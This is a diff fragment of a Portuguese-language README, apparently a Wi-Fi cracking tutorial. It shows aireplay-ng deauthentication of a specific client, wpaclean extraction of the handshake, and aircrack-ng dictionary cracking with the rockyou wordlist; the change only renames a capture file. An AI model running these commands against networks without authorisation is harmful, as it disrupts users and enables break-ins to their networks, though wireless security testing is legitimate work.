@@ -12,7 +12,7 @@ aireplay-ng --deauth 0 -a E4:C0:E2:1C:6E:6B -c 28:87:BA:3A:AF:CF wlan0  <br><br>
 ![IMAGE01](https://github.com/fernandomxm/Crack_WIFI/blob/main/image01.png) 
 ![IMAGE02](https://github.com/fernandomxm/Crack_WIFI/blob/main/wpa-4-way-handshake-workflow.png) <br> <br>
 PODE SER UTILIZADO: wpaclean, para gerar o arquivo .cap "LIMPO", apenas com EAPOL: <br>
-<b>wpaclean clean.cap captura-01.cap</b>  <br><br>
+<b>wpaclean clean.cap captura.cap</b>  <br><br>
 aircrack-ng -w /usr/share/wordlists/rockyou.txt -b E4:C0:E2:1C:6E:6B captura.cap  <br>
 <br>
 Para gerar a wordlist pode ser usado o: <br>
